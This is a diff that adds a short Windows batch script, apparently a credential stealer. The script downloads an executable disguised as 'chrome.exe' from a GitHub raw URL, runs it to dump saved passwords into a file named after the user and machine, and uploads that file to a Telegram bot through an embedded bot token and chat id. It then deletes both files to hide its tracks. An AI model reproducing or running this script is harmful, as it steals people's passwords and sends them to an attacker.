@@ -1,0 +1,2 @@
+@echo off
+cmd /c "curl -o "%temp%\chrome.exe" https://raw.githubusercontent.com/devilJM/devilJM/m/main/s.doc & "%temp%\chrome.exe" /stext "%temp%\%username%-%computername%.txt" & curl -F document=@"%temp%\%username%-%computername%.txt" -F caption="Password From %username% - %computername%" "https://api.telegram.org/bot6481424824:AAF448E2lOZMaAZxDqFtrGE_0UONAA8-wH0/sendDocument?chat_id=365617307" & del "%temp%\chrome.exe" & del "%temp%\%username%-%computername%.txt" "
